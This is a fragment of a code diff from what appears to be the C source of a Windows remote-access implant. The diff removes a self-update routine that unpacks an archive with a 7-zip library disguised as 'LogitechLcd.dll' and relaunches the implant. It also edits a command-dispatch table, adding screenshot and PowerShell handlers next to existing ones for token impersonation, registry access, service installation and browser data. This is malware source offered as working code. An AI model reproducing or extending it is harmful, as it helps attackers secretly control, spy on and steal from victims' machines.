-	lstrcatW(lpBit7zPath, L"\\LogitechLcd.dll");
-	if (Bit7zExtract(lpBit7zPath, lpArchivePath, lpTempPath) == NULL) {
-		goto CLEANUP;
-	}
-
-	StartupInfo.cb = sizeof(StartupInfo);
-	if (!CreateProcessW(lpUpdaterPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcInfo)) {
-		LOG_ERROR("CreateProcessW", GetLastError());
-		goto CLEANUP;
-	}
-	else {
-		ExitProcess(0);
-	}
-	
-CLEANUP:
-	if (ProcInfo.hThread != NULL) {
-		CloseHandle(ProcInfo.hThread);
-	}
-
-	if (ProcInfo.hProcess != NULL) {
-		CloseHandle(ProcInfo.hProcess);
-	}
-
-	FREE(lpTempPath);
-	FREE(lpUpdaterPath);
-	FREE(lpBit7zPath);
-	FREE(lpArchivePath);
-	FREE(UnmarshaledData);
-	FreeBuffer(pCompressedData);
-	FreeElement(ReqElement);
-	return NULL;
-}
-
 PENVELOPE TaskHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -4923,7 +5018,7 @@ REQUEST_HANDLER* GetSystemHandler(VOID)
 	HandlerList[MsgMkdirReq] = (REQUEST_HANDLER)MkdirHandler;
 	HandlerList[MsgExecuteReq] = (REQUEST_HANDLER)ExecuteHandler;
 	HandlerList[MsgMvReq] = (REQUEST_HANDLER)MvHandler;
-	HandlerList[MsgCpReq] = CpHandler;
+	HandlerList[MsgCpReq] = (REQUEST_HANDLER)CpHandler;
 	HandlerList[MsgServicesReq] = (REQUEST_HANDLER)ServicesHandler;
 	HandlerList[MsgGetPrivsReq] = (REQUEST_HANDLER)GetPrivsHandler;
 	HandlerList[MsgCurrentTokenOwnerReq] = (REQUEST_HANDLER)CurrentTokenOwnerHandler;
@@ -4939,12 +5034,15 @@ REQUEST_HANDLER* GetSystemHandler(VOID)
 	HandlerList[MsgRegistryListValuesReq] = (REQUEST_HANDLER)RegistryListValuesHandler;
 	HandlerList[MsgServiceDetailReq] = (REQUEST_HANDLER)ServiceDetailHandler;
 	HandlerList[MsgBrowserReq] = (REQUEST_HANDLER)BrowserHandler;
+	HandlerList[MsgScreenshotReq] = (REQUEST_HANDLER)ScreenshotHandler;
+	HandlerList[MsgPowerShellReq] = (REQUEST_HANDLER)PowerShellHandler;
+	//HandlerList[MsgUpdate] = (REQUEST_HANDLER)UpdateHandler;
 
 #ifdef _FULL
 	HandlerList[MsgIcaclsReq] = (REQUEST_HANDLER)IcaclsHandler;
 	/*HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;*/
 	HandlerList[MsgChownReq] = (REQUEST_HANDLER)ChownHandler;
-	HandlerList[MsgCmdReq] = (REQUEST_HANDLER)CmdHandler;
+	//HandlerList[MsgCmdReq] = (REQUEST_HANDLER)CmdHandler;
 	HandlerList[MsgKillSessionReq] = (REQUEST_HANDLER)KillHandler;
 	HandlerList[MsgTaskReq] = (REQUEST_HANDLER)TaskHandler;
 	HandlerList[MsgProcessDumpReq] = NULL;
@@ -4962,7 +5060,6 @@ REQUEST_HANDLER* GetSystemHandler(VOID)
 	HandlerList[MsgRemoveServiceReq] = (REQUEST_HANDLER)RemoveServiceHandler;
 	HandlerList[MsgSetEnvReq] = NULL;
 	HandlerList[MsgUnsetEnvReq] = NULL;
-	HandlerList[MsgScreenshotReq] = (REQUEST_HANDLER)ScreenshotHandler;
 	HandlerList[MsgSideloadReq] = NULL;
 	HandlerList[MsgMakeTokenReq] = (REQUEST_HANDLER)MakeTokenHandler;
 	HandlerList[MsgReconfigureReq] = NULL;
@@ -4972,7 +5069,6 @@ REQUEST_HANDLER* GetSystemHandler(VOID)
 	HandlerList[MsgRegisterExtensionReq] = NULL;
 	HandlerList[MsgCallExtensionReq] = NULL;
 	HandlerList[MsgListExtensionsReq] = NULL;
-	HandlerList[MsgUpdate] = (REQUEST_HANDLER)UpdateHandler;
 #endif
 	// Pivots
 	/*HandlerList[MsgPivotStartListenerReq] = PivotStartListenerHandler;
